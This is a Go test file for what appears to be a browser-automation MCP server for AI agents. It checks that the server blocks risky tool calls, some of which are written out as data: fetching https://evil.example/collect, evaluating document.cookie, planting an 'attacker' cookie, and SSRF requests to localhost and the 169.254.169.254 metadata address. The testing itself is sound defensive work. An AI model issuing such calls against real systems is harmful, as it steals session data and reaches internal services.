package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/ehmo/gomoufox/internal/cli"
	mcpserver "github.com/ehmo/gomoufox/internal/mcp"
)

func TestMainWrapperReturnsRunnerExitCode(t *testing.T) {
	var stdout bytes.Buffer
	code := Main(context.Background(), []string{"--version"}, cli.Streams{Stdout: &stdout})
	if code != cli.ExitOK {
		t.Fatalf("code = %d", code)
	}
	if stdout.String() == "" {
		t.Fatalf("empty version output")
	}
}

func TestMainUsesProcessDefaults(t *testing.T) {
	oldArgs := mainArgs
	oldExit := mainExit
	oldStreams := mainStreams
	defer func() {
		mainArgs = oldArgs
		mainExit = oldExit
		mainStreams = oldStreams
	}()

	if mainArgs() == nil {
		t.Fatalf("default args = nil")
	}
	defaultStreams := mainStreams()
	if defaultStreams.Stdin == nil || defaultStreams.Stdout == nil || defaultStreams.Stderr == nil {
		t.Fatalf("default streams = %#v", defaultStreams)
	}

	var stdout bytes.Buffer
	mainArgs = func() []string { return []string{"--version"} }
	mainStreams = func() cli.Streams { return cli.Streams{Stdout: &stdout} }

	gotCode := -1
	mainExit = func(code int) { gotCode = code }

	main()

	if gotCode != cli.ExitOK {
		t.Fatalf("exit code = %d, want %d", gotCode, cli.ExitOK)
	}
	if stdout.String() == "" {
		t.Fatalf("empty version output")
	}
}

func TestBuiltBinarySpeaksMCPStdio(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	version := "v0.1.0-test"
	bin := buildGomoufoxBinaryForTest(t, ctx, version)

	versionCmd := exec.CommandContext(ctx, bin, "--version")
	versionOut, err := versionCmd.CombinedOutput()
	if err != nil {
		t.Fatalf("version command: %v\n%s", err, versionOut)
	}
	if string(versionOut) != "gomoufox "+version+"\n" {
		t.Fatalf("version output = %q", versionOut)
	}

	input := strings.Join([]string{
		`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}`,
		`{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}`,
		`{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"session_list","arguments":{}}}`,
		`{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"skills_get","arguments":{"name":"core","max_bytes":80}}}`,
		`{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"browser_navigate","arguments":{"url":"file:///tmp/secret"}}}`,
		`{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"browser_evaluate","arguments":{"script":"document.cookie"}}}`,
		`{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"browser_cookies","arguments":{"action":"get","include_values":true}}}`,
		`{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"browser_cookies","arguments":{"action":"set","cookies":[{"name":"sid","value":"attacker"}]}}}`,
		`{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"browser_cookies","arguments":{"action":"clear"}}}`,
		`{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"session_save","arguments":{"include_state":true}}}`,
		`{"jsonrpc":"2.0","id":11,"method":"tools/call","params":{"name":"session_load","arguments":{"state":{"cookies":[{"name":"sid","value":"attacker"}],"origins":[]}}}}`,
		`{"jsonrpc":"2.0","id":12,"method":"tools/call","params":{"name":"browser_snapshot","arguments":{"include_values":true}}}`,
		`{"jsonrpc":"2.0","id":13,"method":"tools/call","params":{"name":"browser_fetch","arguments":{"url":"https://evil.example/collect"}}}`,
		`{`,
		`{"jsonrpc":"2.0","method":"notifications/initialized","params":{}}`,
	}, "\n") + "\n"
	lines := runMCPStdioForTest(t, ctx, bin, []string{"--session-dir", filepath.Join(t.TempDir(), "sessions")}, input)
	if len(lines) != 14 {
		t.Fatalf("mcp stdio responses = %#v", lines)
	}
	if result := jsonRPCResultForTest(t, lines[0]); result["serverInfo"].(map[string]any)["name"] != "gomoufox" || result["serverInfo"].(map[string]any)["version"] != version {
		t.Fatalf("initialize result = %#v", result)
	}
	toolsResult := jsonRPCResultForTest(t, lines[1])
	tools := toolsResult["tools"].([]any)
	if len(tools) != len(mcpserver.Tools()) {
		t.Fatalf("tools count = %d", len(tools))
	}
	if len(lines[1]) > 30000 {
		t.Fatalf("tools/list response is too large for agent discovery: %d bytes", len(lines[1]))
	}
	sessionResult := jsonRPCResultForTest(t, lines[2])
	if sessionResult["isError"] == true || sessionResult["structuredContent"].(map[string]any)["sessions"] == nil {
		t.Fatalf("session_list result = %#v", sessionResult)
	}
	skillResult := jsonRPCResultForTest(t, lines[3])
	skillStructured := skillResult["structuredContent"].(map[string]any)
	if skillStructured["body"] != nil || skillStructured["name"] != "core" || !strings.Contains(skillResult["content"].([]any)[0].(map[string]any)["text"].(string), `"truncated":true`) {
		t.Fatalf("skills_get result = %#v", skillResult)
	}
	blockedResult := jsonRPCResultForTest(t, lines[4])
	if blockedResult["isError"] != true || blockedResult["structuredContent"].(map[string]any)["error"] != "url_blocked" {
		t.Fatalf("pre-browser security result = %#v", blockedResult)
	}
	for _, tc := range []struct {
		line int
		code string
	}{
		{5, "eval_disabled"},
		{6, "cookie_values_disabled"},
		{7, "cookie_mutation_disabled"},
		{8, "cookie_mutation_disabled"},
		{9, "session_export_disabled"},
		{10, "session_import_disabled"},
		{11, "snapshot_values_disabled"},
		{12, "browser_fetch_disabled"},
	} {
		jsonRPCToolErrorForTest(t, lines[tc.line], tc.code)
	}
	if code := jsonRPCErrorCodeForTest(t, lines[13]); code != -32700 {
		t.Fatalf("parse error code = %d response=%s", code, lines[13])
	}

	privateFetchInput := strings.Join([]string{
		`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"browser_fetch","arguments":{"url":"http://127.0.0.1/admin"}}}`,
		`{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"browser_fetch","arguments":{"url":"http://93.184.216.34","navigate_first":"http://169.254.169.254/latest/meta-data"}}}`,
	}, "\n") + "\n"
	privateLines := runMCPStdioForTest(t, ctx, bin, []string{"--allow-browser-fetch", "--allowed-hosts", "93.184.216.34", "--session-dir", filepath.Join(t.TempDir(), "sessions")}, privateFetchInput)
	if len(privateLines) != 2 {
		t.Fatalf("private fetch responses = %#v", privateLines)
	}
	jsonRPCToolErrorForTest(t, privateLines[0], "url_blocked")
	jsonRPCToolErrorForTest(t, privateLines[1], "url_blocked")
}

func runMCPStdioForTest(t *testing.T, ctx context.Context, bin string, args []string, input string) []string {
	t.Helper()
	if len(args) == 0 || args[0] != "mcp" {
		args = append([]string{"mcp"}, args...)
	}
	cmd := exec.CommandContext(ctx, bin, args...)
	cmd.Stdin = strings.NewReader(input)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		t.Fatalf("mcp stdio run: %v\nstdout=%s\nstderr=%s", err, stdout.String(), stderr.String())
	}
	if stderr.Len() != 0 {
		t.Fatalf("mcp stdio wrote stderr: %s", stderr.String())
	}
	var lines []string
	scanner := bufio.NewScanner(&stdout)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		t.Fatal(err)
	}
	return lines
}

func TestBuiltBinaryMCPHTTPAuth(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	bin := buildGomoufoxBinaryForTest(t, ctx, "v0.1.0-test")
	port := freeTCPPortForTest(t)
	serverCtx, stopServer := context.WithCancel(ctx)
	defer stopServer()

	cmd := exec.CommandContext(serverCtx, bin, "mcp", "--transport", "http", "--auth-token", "tok", "--port", strconv.Itoa(port), "--session-dir", filepath.Join(t.TempDir(), "sessions"))
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	waitErr := make(chan error, 1)
	go func() { waitErr <- cmd.Wait() }()
	defer func() {
		stopServer()
		select {
		case <-waitErr:
		case <-time.After(5 * time.Second):
			_ = cmd.Process.Kill()
			<-waitErr
		}
		if stdout.Len() != 0 {
			t.Fatalf("http mcp wrote stdout: %s", stdout.String())
		}
		if stderr.Len() != 0 {
			t.Fatalf("http mcp wrote stderr: %s", stderr.String())
		}
	}()

	endpoint := fmt.Sprintf("http://127.0.0.1:%d/mcp", port)
	client := &http.Client{Timeout: 500 * time.Millisecond}
	unauthorized := waitForMCPHTTPForTest(t, client, endpoint, "", waitErr)
	if unauthorized.StatusCode != http.StatusUnauthorized {
		t.Fatalf("unauthorized status = %d", unauthorized.StatusCode)
	}
	_ = unauthorized.Body.Close()

	authorized := postMCPForTest(t, client, endpoint, "tok", `{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}`)
	defer func() { _ = authorized.Body.Close() }()
	if authorized.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(authorized.Body)
		t.Fatalf("authorized status = %d body=%s", authorized.StatusCode, body)
	}
	body, err := io.ReadAll(authorized.Body)
	if err != nil {
		t.Fatal(err)
	}
	result := jsonRPCResultForTest(t, string(body))
	if len(result["tools"].([]any)) != len(mcpserver.Tools()) {
		t.Fatalf("authorized tools/list = %#v", result)
	}
	authorizedSkill := postMCPForTest(t, client, endpoint, "tok", `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"skills_list","arguments":{}}}`)
	defer func() { _ = authorizedSkill.Body.Close() }()
	body, err = io.ReadAll(authorizedSkill.Body)
	if err != nil {
		t.Fatal(err)
	}
	result = jsonRPCResultForTest(t, string(body))
	if result["structuredContent"].(map[string]any)["skills"] == nil {
		t.Fatalf("authorized skills_list = %#v", result)
	}
}

func buildGomoufoxBinaryForTest(t *testing.T, ctx context.Context, version string) string {
	t.Helper()
	name := "gomoufox"
	if runtime.GOOS == "windows" {
		name += ".exe"
	}
	bin := filepath.Join(t.TempDir(), name)
	ldflags := "-X github.com/ehmo/gomoufox/internal/buildinfo.Version=" + version
	build := exec.CommandContext(ctx, "go", "build", "-trimpath", "-buildvcs=false", "-ldflags", ldflags, "-o", bin, ".")
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build gomoufox: %v\n%s", err, out)
	}
	return bin
}

func freeTCPPortForTest(t *testing.T) int {
	t.Helper()
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = listener.Close() }()
	return listener.Addr().(*net.TCPAddr).Port
}

func waitForMCPHTTPForTest(t *testing.T, client *http.Client, endpoint, token string, waitErr <-chan error) *http.Response {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case err := <-waitErr:
			t.Fatalf("mcp http exited before serving: %v", err)
		default:
		}
		resp, err := postMCPForTestNoFatal(client, endpoint, token, `{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}`)
		if err == nil {
			return resp
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatal("timed out waiting for mcp http server")
	return nil
}

func postMCPForTest(t *testing.T, client *http.Client, endpoint, token, body string) *http.Response {
	t.Helper()
	resp, err := postMCPForTestNoFatal(client, endpoint, token, body)
	if err != nil {
		t.Fatal(err)
	}
	return resp
}

func postMCPForTestNoFatal(client *http.Client, endpoint, token, body string) (*http.Response, error) {
	req, err := http.NewRequest(http.MethodPost, endpoint, strings.NewReader(body))
	if err != nil {
		return nil, err
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	req.Header.Set("Content-Type", "application/json")
	return client.Do(req)
}

func jsonRPCResultForTest(t *testing.T, line string) map[string]any {
	t.Helper()
	var resp map[string]any
	if err := json.Unmarshal([]byte(line), &resp); err != nil {
		t.Fatalf("decode response %q: %v", line, err)
	}
	if resp["error"] != nil {
		t.Fatalf("unexpected rpc error: %#v", resp["error"])
	}
	result, ok := resp["result"].(map[string]any)
	if !ok {
		t.Fatalf("missing result: %#v", resp)
	}
	return result
}

func jsonRPCToolErrorForTest(t *testing.T, line, code string) {
	t.Helper()
	result := jsonRPCResultForTest(t, line)
	if result["isError"] != true {
		t.Fatalf("tool error isError = %#v in %s", result["isError"], line)
	}
	structured, ok := result["structuredContent"].(map[string]any)
	if !ok || structured["error"] != code {
		t.Fatalf("tool error structuredContent = %#v, want %s", result["structuredContent"], code)
	}
	content, ok := result["content"].([]any)
	if !ok || len(content) == 0 {
		t.Fatalf("tool error missing content = %#v", result)
	}
	text, _ := content[0].(map[string]any)["text"].(string)
	if !strings.Contains(text, code) {
		t.Fatalf("tool error text = %q, want %s", text, code)
	}
}

func jsonRPCErrorCodeForTest(t *testing.T, line string) int {
	t.Helper()
	var resp map[string]any
	if err := json.Unmarshal([]byte(line), &resp); err != nil {
		t.Fatalf("decode response %q: %v", line, err)
	}
	errObj, ok := resp["error"].(map[string]any)
	if !ok {
		t.Fatalf("missing error: %#v", resp)
	}
	return int(errObj["code"].(float64))
}
